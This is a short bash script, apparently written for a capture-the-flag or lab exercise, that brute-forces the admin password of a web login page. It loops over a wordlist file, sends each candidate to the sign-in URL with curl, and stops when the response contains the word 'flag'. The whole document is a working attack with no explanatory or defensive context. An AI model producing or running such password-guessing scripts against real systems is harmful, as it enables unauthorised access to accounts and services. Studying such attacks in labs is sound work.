#!/bin/bash
input="./john.txt"
while IFS= read -r line
do
  echo "$line"
   R=`curl -L "http://10.12.100.108/index.php?page=signin&username=admin&password=${line}&Login=Login#" | grep "flag"`
	if [ ! -z "$R" ]
		then
      echo "Password is : "
	  tput setaf 2
	  echo $line
	  break
	fi
done < "$input"